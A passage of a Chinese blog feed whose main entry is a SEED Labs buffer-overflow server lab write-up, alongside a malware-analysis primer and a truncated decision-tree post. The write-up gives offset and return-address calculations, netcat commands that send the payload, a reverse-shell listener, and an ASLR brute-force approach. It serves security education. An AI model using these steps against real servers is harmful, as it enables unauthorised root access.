aria-hidden="true">image-20231012104458546</figcaption></figure><h2 id="peview">7.3 PEview</h2><p>查看PE文件头部信息</p><p>参考教程：</p><p><ahref="https://zhuanlan.zhihu.com/p/24208568">常见恶意软件工具分析（一）- 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH00-恶意代码分析技术入门</title>
    <link href="/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/00%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8/"/>
    <url>/2023/10/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/00%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="恶意代码基础知识">1 恶意代码基础知识</h1><h2 id="定义">1.1 定义</h2><p>使计算机按照攻击者的意图运行以达到恶意目的的<strong>指令集合</strong>（二进制执行文件，脚本语言代码，宏代码，寄生在文件、启动扇区的指令流）</p><h2 id="分类">1.2 分类</h2><ul><li>计算机病毒(Virus)：<ul><li>定义特征：通过感染文件(可执行文件、数据文件、电子邮件等)或磁盘引导扇区进行传播，一般<strong>需要</strong>宿主程序被执行或人为交互才能运行。</li><li>典型实例：Brain，Concept，CIH，勒索软件</li></ul></li><li>蠕虫(Worm)：<ul><li>定义特征：一般为<strong>不需要</strong>宿主的单独文件，通过网络传播，自动复制，通常无需人为交互便可感染传播。</li><li>典型实例：Morris，CodeRed，Slammer</li></ul></li><li>启动器(Downloader)：<ul><li>定义特征：从远程主机下载到本地执行的轻量级恶意代码，不需要或仅需要极少的人为干预。代表性的开发工具有：JavaScript，VBScript，Java，以及ActiveX。启动其他恶意程序的恶意代码。</li><li>典型实例：SantyWorm等。</li></ul></li><li>后门(Backdoor)：<ul><li>定义特征：绕过正常的安全控制机制，从而为攻击者提供访问途径。</li><li>典型实例：Netcat，BO，冰河，Glupteba。</li></ul></li><li>特洛伊木马(Trojan)：<ul><li>定义特征：伪装成有用软件，隐藏其恶意目标，欺骗用户安装执行。</li><li>典型实例：Setiri，Emotet，Dridex，Ramnit</li></ul></li><li>僵尸程序(Bot)：<ul><li>定义特征：一般为<strong>不需要</strong>宿主的单独文件，通过网络传播，自动复制，通常无需人为交互便可感染传播；使用一对多的命令与控制机制组成僵尸网络。</li><li>典型实例：Sdbot，Agobot，Mirai，Glupteba</li></ul></li><li>内核套件(Rootkit)：<ul><li>定义特征：通过替换或修改系统关键可执行文件（用户态），或者通过控制操作系统内核(内核态)，用以获取并保持最高控制权(rootaccess)。</li><li>典型实例：LRK，FU，hdef</li></ul></li><li>融合型恶意代码及Bootkit：<ul><li>定义特征：融合上述多种恶意代码技术，构成更具破坏性的恶意代码形态，如Bootkit。</li><li>典型实例：Nimda、Stuxnet、Flame、Duqu</li></ul></li></ul><h1 id="恶意代码分析技术">2 恶意代码分析技术</h1><table><thead><tr class="header"><th><strong>区别项</strong></th><th><strong>恶意代码分析</strong></th><th><strong>良性代码分析</strong></th></tr></thead><tbody><tr class="odd"><td>目的公开性</td><td>目的未知，需分析和推测其目的</td><td>一般情况下，目的是公开且明确的，可辅助分析过程</td></tr><tr class="even"><td>目的恶意性</td><td>恶意目的，需要受控环境</td><td>良性，无需受控环境</td></tr><tr class="odd"><td>是否存在源码</td><td>绝大多数情况无源码，二进制分析</td><td>开源软件存在源码，源码分析；闭源软件则需二进制分析</td></tr><tr class="even"><td>使用对抗分析技术</td><td>各种多样化对抗分析，博弈问题</td><td>一般无对抗分析，商业软件也引入对抗分析保护产权</td></tr></tbody></table><ul><li><strong>静态</strong>分析<ul><li>通过反病毒引擎扫描识别已知的恶意代码家族和变种名</li><li>逆向分析恶意代码模块构成，内部数据结构，关键控制流程等，理解恶意代码的机理，并提取特征码用于检测。</li><li>分析方法：恶意代码扫描、文件格式识别、字符串提取、二进制结构分析、反汇编、反编译、代码结构与逻辑分析、加壳识别和代码脱壳</li></ul></li><li><strong>动态</strong>分析<ul><li>通过在受控环境中执行目标代码，以获取目标代码的行为及运行结果。</li><li>分析方法：快照比对、动态行为监控(APIHooking)、网络监控、沙盒(sandbox)、动态跟踪调试</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Buffer-Overflow Attack Lab (Server Version)</title>
    <link href="/2023/10/11/SEED-LABS/Software%20Security/Buffer-Overflow%20Attack%20Lab%20(Server%20Version)/"/>
    <url>/2023/10/11/SEED-LABS/Software%20Security/Buffer-Overflow%20Attack%20Lab%20(Server%20Version)/</url>
    
    <content type="html"><![CDATA[<h1 id="overview">1 Overview</h1><ul><li>缓冲区溢出是指程序试图将数据写入预先分配的固定长度缓冲区边界之外的情况。恶意用户可利用此漏洞改变程序的流控制，甚至执行任意代码。此漏洞是由于数据存储（如缓冲区）和控件存储（如返回地址）的混合造成的：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。</li><li>本实验将提供四台不同的服务器，每台服务器运行一个带有缓冲区溢出漏洞的程序。实验任务是开发一个利用漏洞的程序，并最终获得这些服务器上的root权限。除了进行这些攻击实验之外，还将试验几种针对缓冲区溢出攻击的对策。学生需要评估这些计划是否有效，并解释原因。</li></ul><h1 id="实验环境搭建">2 实验环境搭建</h1><ol type="1"><li><p>关闭随机化地址策略，此步骤是为了保证程序每次执行时的初始地址不变，以便于进行多次实验和调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /sbin/sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049695.png"alt="image-20231011094531325" /><figcaption aria-hidden="true">image-20231011094531325</figcaption></figure></li><li><p>编译并拷贝。由于 Makefile中已经提供了编译命令，我们仅需执行下列指令即可，此处编译关闭了栈保护和不可执行堆栈</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make<br>make install<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049696.png"alt="image-20231011094543773" /><figcaption aria-hidden="true">image-20231011094543773</figcaption></figure></li><li><p>拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dcbuild<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049697.png"alt="image-20231011094803752" /><figcaption aria-hidden="true">image-20231011094803752</figcaption></figure></li><li><p>运行容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dcup<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049698.png"alt="image-20231011094900036" /><figcaption aria-hidden="true">image-20231011094900036</figcaption></figure></li><li><p>查看是否开启成功，可以看到已有 4 个容器正在运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dockps<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049699.png"alt="image-20231011094928526" /><figcaption aria-hidden="true">image-20231011094928526</figcaption></figure></li></ol><h1 id="task-1-get-familiar-with-the-shellcode">3 Task 1: Get Familiarwith the Shellcode</h1><ol type="1"><li><p>目标：修改 shellcode，使其能够删除文件</p></li><li><p>根据提示，如果我们想让 shellcode 运行其他命令，只需修改第3行中的命令字符串即可。注意：修改过程中要保持shellcode长度不变，即末尾*位置不变，可以通过添加或删除空格实现。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049700.png"alt="image-20231011095123331" /><figcaption aria-hidden="true">image-20231011095123331</figcaption></figure></li><li><p>以修改 64 位代码为例，首先将<code>shellcode_64.py</code>复制到<code>my_shellcode_64.py</code>，方便后续查看原文件</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049701.png"alt="image-20231011095221851" /><figcaption aria-hidden="true">image-20231011095221851</figcaption></figure></li><li><p>修改命令为删除文件，上图为原代码，下图为修改后代码</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049702.png"alt="image-20231011095247870" /><figcaption aria-hidden="true">image-20231011095247870</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049704.png"alt="image-20231011095252811" /><figcaption aria-hidden="true">image-20231011095252811</figcaption></figure></li><li><p>步骤 1：创建删除测试文件；步骤 2：执行修改后的脚本文件，从而生成<code>codefile_64</code>；步骤 3：编译<code>call_shellcode.c</code>；步骤 4：先执行<code>a64.out</code>，然后查看当前目录文件，经过比对，发现成功删除<code>testfile</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049705.png"alt="image-20231011095437510" /><figcaption aria-hidden="true">image-20231011095437510</figcaption></figure></li><li><p><strong>小结</strong>：在攻击中，shellcode是一段用于利用软件漏洞的有效负载，shellcode 是 16进制的机器码，以其经常让攻击者获得shell 而得名。shellcode常常使用机器语言编写。 可在寄存器eip 溢出后，放入一段可让 CPU 执行的shellcode 机器码，让电脑可以执行攻击者的任意指令。</p></li></ol><h1 id="task-2-level-1-attack">4 Task 2: Level-1 Attack</h1><ol type="1"><li><p>目标：运行于 10.9.0.5（端口号为 9090），易受攻击的程序是一个 32位程序。</p></li><li><p>原理：栈底为高地址，栈顶为低地址，栈由高地址向低地址增长。栈帧储存的是一个函数在栈中的信息，一般来说相邻的栈帧的关系是父函数与子函数之间的关系，子函数的栈底指针会保存父函数栈底指针的地址。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049706.png"alt="image-20231011100137705" /><figcaption aria-hidden="true">image-20231011100137705</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310240940419.png"alt="image-20231024093950979" /><figcaption aria-hidden="true">image-20231024093950979</figcaption></figure></li><li><p>向目标服务器 10.9.0.5发送消息，然后观察服务器端打印出的信息，得到帧指针（ebp）：<code>0xffffd608</code>和 buffer地址：<code>0xffffd598</code>。重复两次，发现得到地址未发生变化，说明地址随机化已关闭。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049708.png"alt="image-20231011100354334" /><figcaption aria-hidden="true">image-20231011100354334</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049709.png"alt="image-20231011100401123" /><figcaption aria-hidden="true">image-20231011100401123</figcaption></figure></li><li><p>修改 exploit.py，具体如下：</p><ul><li><p>根据提供的 shellcode.txt 修改 shellcode</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049710.png"alt="image-20231011100544158" /><figcaption aria-hidden="true">image-20231011100544158</figcaption></figure></li><li><p>说明：填充若干长度的，这个机器码对应的指令是 NOP，也就是告诉 CPU什么也不做，然后跳到下一条指令。有了这一段 NOP的填充，只要返回地址能够命中临近shellcode任意位置，最后都可以跳转到shellcode 的起始处。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049711.png"alt="image-20231011100622963" /><figcaption aria-hidden="true">image-20231011100622963</figcaption></figure></li><li><p>构建有效载荷，设置 start= 517-len(shellcode)，517 为content大小，该操作目的是将 content 结尾部分内容替换为攻击代码 shellcode</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049712.png"alt="image-20231011100730129" /><figcaption aria-hidden="true">image-20231011100730129</figcaption></figure></li><li><p>设置 ret=ebp(0xffffd608)+n(n&gt;=8),ebp 即为步骤3）得到的地址，因为关闭了地址随机化，所以每次值都一样。n&gt;=8 原因：32位下，前一个栈帧和返回内容各占 4 字节，使用当前栈帧加上大于 8的数，即可跳到 shellcode 前的覆盖区（填充了 NOP指令），之后代码可以逐步运行到 shellcode 的起始处。注意：n值不能过大，过大可能无法命中覆盖区，此处以n=8 为例。Offset 为偏移值=ebp地址(0xffffd608)- 缓冲区地址(0xffffd598)+4=116，用来指示 ret地址，从而用新 ret进行覆盖。注意：offset 为 10 进制数。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049713.png"alt="image-20231011100919148" /><figcaption aria-hidden="true">image-20231011100919148</figcaption></figure></li></ul></li><li><p>生成 badfile，发送给服务器</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049714.png"alt="image-20231011100945179" /><figcaption aria-hidden="true">image-20231011100945179</figcaption></figure></li><li><p>观察到 shellcode 中代码成功执行</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049715.png"alt="image-20231011101010254" /><figcaption aria-hidden="true">image-20231011101010254</figcaption></figure></li><li><p>reverse shell</p><ul><li><p>修改 exploit.py 中shellcode，需要先注释掉之前的命令。新命令含义：在服务器机器上启动一个bash shell，其输入来自 TCP 连接，输出也重定向到 TCP连接，此处为10.9.0.1:7070。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049716.png"alt="image-20231011101057494" /><figcaption aria-hidden="true">image-20231011101057494</figcaption></figure></li><li><p>重新生成 badfile</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049717.png"alt="image-20231011101112647" /><figcaption aria-hidden="true">image-20231011101112647</figcaption></figure></li><li><p>在本机开启监听端口，对应 shellcode 中的 7070 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lnv 7070<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049718.png"alt="image-20231011101141673" /><figcaption aria-hidden="true">image-20231011101141673</figcaption></figure></li><li><p>将 badfile 发送给服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> badfile | nc 10.9.0.5 9090<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049719.png"alt="image-20231011101158575" /><figcaption aria-hidden="true">image-20231011101158575</figcaption></figure></li><li><p>查看 ip 发现显示服务器的 ip，成功实现反弹 shell</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049720.png"alt="image-20231011101222506" /><figcaption aria-hidden="true">image-20231011101222506</figcaption></figure></li></ul></li></ol><h1 id="task-3-level-2-attack">5 Task 3: Level-2 Attack</h1><ol type="1"><li><p>目标：目标服务器是 10.9.0.6，端口号仍为 9090，易受攻击程序仍为 32位程序</p></li><li><p>向目标服务器 10.9.0.6送消息，然后观察服务器端打印出的信息。信息中仅包含 buffer地址(0xffffd2b8)，没有显示帧指针的值,即无法直接计算出 ret 地址。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049721.png"alt="image-20231011101500690" /><figcaption aria-hidden="true">image-20231011101500690</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049722.png"alt="image-20231011101505995" /><figcaption aria-hidden="true">image-20231011101505995</figcaption></figure></li><li><p>修改 exploit.py。ret=0xffffd2b8(buffer地址)+300(缓冲区最大容量)+8(前ebp+ret)=0xffffd3ec，加上的值只用大于等于308，能命中shellcode前填充区，让 shellcode 执行即可，此处以加 308为例。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049723.png"alt="image-20231011101548428" /><figcaption aria-hidden="true">image-20231011101548428</figcaption></figure></li><li><p><strong>难点</strong>：offset值如何设定。因为只能构建一个有效载荷，该有效载荷需要可用于此范围内的任何缓冲区大小。根据实验指导得知buffer_size的限制在：[100, 300]。并且，在 32位程序中，由于内存对齐的原因，在帧指针中存储的值总是四的倍数。因此我们直接将所有可能的位置都用新ret 地址进行覆盖。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049724.png"alt="image-20231011101948481" /><figcaption aria-hidden="true">image-20231011101948481</figcaption></figure></li><li><p>重新生成 badfile，在本机开启监听端口，将 badfile发送给目标服务端。查看 ip 发现显示服务器的 ip，成功实现反弹shell。（基本同上）</p></li></ol><h1 id="task-4-level-3-attack">6 Task 4: Level-3 Attack</h1><ol type="1"><li><p>目标：目标服务器是 10.9.0.7，开放端口为 9090，运行 64位程序</p></li><li><p>向目标服务器 10.9.0.7送消息，然后观察服务器端打印出的信息。观察到栈帧值和 buffer 地址变为了 8字节。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049725.png"alt="image-20231011102140559" /><figcaption aria-hidden="true">image-20231011102140559</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049726.png"alt="image-20231011102145762" /><figcaption aria-hidden="true">image-20231011102145762</figcaption></figure></li><li><p><strong>难点</strong>：64 位计算机中的地址范围为0x00-0x00007FFFFFFFFFFF，因此所有地址最高位的两个字节都是 0x00。而strcpy 函数遇到 0会停止，如果和前面的方法一样，则无法成功拷贝shellcode。解决方案：不再将 shellcode 放在 badfile结尾部分，而是将其放至 badfile 开头，令ret的值指向前面部分。由于是小端存储，在截止前ret前面内容及其非零部分已经被成功拷贝。</p></li><li><p>修改 exploit.py 中 shellcode，采用 task1 中使用的 64位shellcode</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049727.png"alt="image-20231011102413481" /><figcaption aria-hidden="true">image-20231011102413481</figcaption></figure></li><li><p>start 设置为 0（也可以是其他较小值，目的是让 shellcode 在ret前），使 shellcode 位于 badfile 开头</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049728.png"alt="image-20231011102436372" /><figcaption aria-hidden="true">image-20231011102436372</figcaption></figure></li><li><p>ret=buffer地址(0x00007fffffffe1e0)+start，此处为0x00007fffffffe1e0；offset=rbp(0x00007fffffffe2b0)-buffer(0x00007fffffffe1e0)+8(rbp占 8 字节)=216，offset 为 10 进制。ret 转为字节码的部分需要改为以 8为步长。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049729.png"alt="image-20231011102528980" /><figcaption aria-hidden="true">image-20231011102528980</figcaption></figure></li><li><p>重新生成 badfile，在本机开启监听端口，将 badfile发送给目标服务端。查看 ip 发现显示服务器的 ip，成功实现反弹shell。（基本同上）</p></li></ol><h1 id="task-5-level-4-attack">7 Task 5: Level-4 Attack</h1><ol type="1"><li><p>目标：目标服务器是 10.9.0.8，开放端口为 9090，运行 64位程序</p></li><li><p>向目标服务器 10.9.0.7 送消息，然后观察服务器端打印出的信息。发现buffer 大小仅为 96 字节。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049730.png"alt="image-20231011102717893" /><figcaption aria-hidden="true">image-20231011102717893</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049731.png"alt="image-20231011102722540" /><figcaption aria-hidden="true">image-20231011102722540</figcaption></figure></li><li><p>难点：buffer 大小过小，可能无法容纳shellcode，因此需要将shellcode 放在 badfile 结尾处。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049732.png"alt="image-20231011102745704" /><figcaption aria-hidden="true">image-20231011102745704</figcaption></figure></li><li><p>offset=rbp-buffer+8=104,基本原理同上一个task。<strong>难点</strong>在于返回地址的设置，因为 ret 中 00的存在，结尾的shellcode 不能被成功拷贝，因此需要让 ret 指向主函数中 str数组中 shellcode的位置（注：此处对于 ret 设置不是很清楚）</p></li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049733.png"alt="image-20231011103039147" /><figcaption aria-hidden="true">image-20231011103039147</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049734.png"alt="image-20231011102851075" /><figcaption aria-hidden="true">image-20231011102851075</figcaption></figure><ol start="5" type="1"><li>重新生成 badfile，在本机开启监听端口，将 badfile发送给目标服务端。查看 ip 发现显示服务器的 ip，成功实现反弹shell。（基本同上）</li></ol><h1 id="task-6-experimenting-with-the-address-randomization">8 Task 6:Experimenting with the Address Randomization</h1><ol type="1"><li><p>重新启用地址空间布局随机化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /sbin/sysctl -w kernel.randomize_va_space=2<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049735.png"alt="image-20231011103159396" /><figcaption aria-hidden="true">image-20231011103159396</figcaption></figure></li><li><p>向 level 1 和 level 3 中服务器发送 Hello消息，并发送多次，发现每次地址都在随机变化。<strong>ASLR会使缓冲区溢出攻击变得更加困难原因</strong>：意味着攻击者无法事先知道要攻击的特定内存地址，因为它们在每次启动时都会发生变化；不再能够确定可执行代码或关键数据的确切位置；迫使攻击者需要更复杂的技术来发现内存布局，增加了攻击的难度和成本。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049736.png"alt="image-20231011103317313" /><figcaption aria-hidden="true">image-20231011103317313</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049737.png"alt="image-20231011103323882" /><figcaption aria-hidden="true">image-20231011103323882</figcaption></figure></li><li><p>目标：10.9.0.5:9090，运行32位程序。<strong>解决方案</strong>：无限循环运行易受攻击的程序，暴力破解。Tip：在32 位 Linux 机器上，只能使用 19个位用于地址随机化。这还远远不够，如果我们运行足够多的攻击足够的次数，我们就能轻松击中目标。对于64位机器，用于随机化的位数会大大增加，意味着该方法可能不再有效。</p></li><li><p>使用 Level 1 中 exploit.py 重新生成badfile，在本机开启监听，执行暴力破解脚本，16923 次时成功破解。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049738.png"alt="image-20231011103637351" /><figcaption aria-hidden="true">image-20231011103637351</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049739.png"alt="image-20231011103642836" /><figcaption aria-hidden="true">image-20231011103642836</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049740.png"alt="image-20231011103650245" /><figcaption aria-hidden="true">image-20231011103650245</figcaption></figure></li><li><p>查看 ip 发现显示服务器的 ip，成功实现反弹 shell</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049741.png"alt="image-20231011103708030" /><figcaption aria-hidden="true">image-20231011103708030</figcaption></figure></li></ol><h1 id="task-7-experimenting-with-other-countermeasures">9 Task 7:Experimenting with Other Countermeasures</h1><h2 id="task-7.a-turn-on-the-stackguard-protection">9.1 Task 7.a: Turnon the StackGuard Protection</h2><ol type="1"><li><p>进入 server-code 文件夹，去除 -fno-stack-protector 选项编译stack.c，然后将 badfile作为可执行文件输入。出现报错：<code>stack smashing</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049742.png"alt="image-20231011103821396" /><figcaption aria-hidden="true">image-20231011103821396</figcaption></figure></li><li><p>正常的函数调用时，函数调用栈的示意图</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049743.png"alt="image-20231011104543776" /><figcaption aria-hidden="true">image-20231011104543776</figcaption></figure></li><li><p>StackGuard如何发挥作用。由上图可以看到，缓冲区溢出攻击的核心点在于，由于程序没有检测边界，而攻击者利用这一点，覆盖函数的返回地址。如果我们有办法能检测到程序是否被修改，就可以作出一定的防御，比如检测到被修改，就退出。StackGuard的方法很简单，就是往返回地址后面插入一段特殊值(称之为canary)，在函数返回之前，首先检查这个特殊值是否被修改，如果被修改了，说明发生了缓冲区溢出攻击。更安全的方式是，插入这段特殊值，是随机值。但是，即便如此，攻击者仍然有办法绕过，那就是不修改这段值，而是直接修改返回地址，但是这很难做到，因为攻击者无法知道这段随机值到底是多长。另外由于随机化，攻击者也无法轻易复制这一段随机值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049744.png"alt="image-20231011104754440" /><figcaption aria-hidden="true">image-20231011104754440</figcaption></figure></li><li><p>总结：StackGuard是一种编译器扩展，可增强编译器生成的可执行代码，从而检测并阻止针对堆栈的缓冲区溢出攻击。其效果对程序的正常功能是透明的。要注意到程序是否经过StackGuard 增强，唯一的方法就是使程序执行具有未定义行为的 C 语句：StackGuard增强程序定义了在函数仍处于活动状态时写入函数返回地址的行为。</p></li></ol><h2 id="task-7.b-turn-on-the-non-executable-stack-protection">9.2 Task7.b: Turn on the Non-executable Stack Protection</h2><ol type="1"><li><p>进入 shellcode 文件夹，去除 -z execstack 编译call_shellcode.c并运行，出现报错：<code>Segmentation fault</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049745.png"alt="image-20231011103924910" /><figcaption aria-hidden="true">image-20231011103924910</figcaption></figure></li><li><p>需要注意的是，不可执行堆栈只能只能使 shellcode无法在堆栈上运行，但并不能完全防止缓冲区溢出攻击，因为利用缓冲区溢出漏洞后，还有其他方法运行恶意代码。return-tolibc攻击就是一个例子。</p></li></ol><p>参考教程：</p><ol type="1"><li><ahref="https://seanxz401.github.io/2022/12/27/网络攻防-缓冲区溢出/#Task7">网络攻防-缓冲区溢出- Sean's Blog (seanxz401.github.io)</a></li><li><ahref="https://blog.csdn.net/qq_39678161/article/details/119907828">【SEEDLabs 2.0】Buffer-Overflow Attack_buffer overflow attack lab (serverversion)_嗯嗯哈哈哈哈哈哈嗯嗯哈哈哈的博客-CSDN博客</a></li><li><a href="https://zhuanlan.zhihu.com/p/344448144">StackGuard的作用 -知乎 (zhihu.com)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Software Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>决策树</title>
    <link href="/2023/10/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E7%AF%87/%E5%86%B3%E7%AD%96%E6%A0%91/"/>
    <url>/2023/10/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E7%AF%87/%E5%86%B3%E7%AD%96%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="直观理解">1 直观理解</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550549.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="信息熵">2 信息熵</h1><ul><li><p>信息熵是度量样本集合纯度最常用的一种指标。</p></li><li><p>假定当前样本集合D中第k类样本所占的比例为<spanclass="math inline">\(\mathrm{p}_{\mathrm{k}}(\mathrm{k}=1,2,\ldots,|\mathrm{y}|)\)</span>，则D的信息熵定义为： <spanclass="math display">\[\operatorname{Ent}(D)=-\sum_{k=1}^{|y|} p_k \log _2 p_k\]</span></p></li><li><p>Ent(D)的值越小，则D的纯度越高</p></li></ul><h1 id="信息增益information-gain--id3决策树">3 信息增益（Informationgain）- ID3决策树</h1><ul><li><p>ID3（IterativeDichotomiser，迭代二分器）决策树学习算法，以信息增益准则来选择划分属性。</p></li><li><p>假定离散属性a有V个可能的取值<span class="math inline">\(\lbracea^1,a^2,...,a^V\rbrace\)</span>，若使用a来对样本集D进行划分，则会产生V个分支结点，其中第v个分支结点包含了D中所有在属性a上取值为<spanclass="math inline">\(a^v\)</span>的样本，即为<spanclass="math inline">\(D^v\)</span>。给分支结点赋予权重$$，样本数越多的分支结点的影响越大，信息增益越大，使用属性a对样本集D进行划分所获得的纯度提升越大。以属性a对数据集D进行划分所获得的信息增益为：<span class="math display">\[\operatorname{Gain}(\mathrm{D},\mathrm{a})=\operatorname{Ent}(\mathrm{D})-\sum_{\mathrm{v}=1}^{\mathrm{V}}\frac{\left|\mathrm{D}^{\mathrm{v}}\right|}{|\mathrm{D}|}\operatorname{Ent}\left(\mathrm{D}^{\mathrm{v}}\right)\]</span></p></li><li><p>信息增益准则对可取值数目较多的属性有所偏好，因为属性取值多则划分的更干净。但这可能导致出现一些荒谬错误，于是引入增益率。</p></li></ul><h1 id="增益率gain-ratio--c4.5决策树">4 增益率（Gain Ratio）-C4.5决策树</h1><p><span class="math display">\[\text { Gain\_ratio(D, a 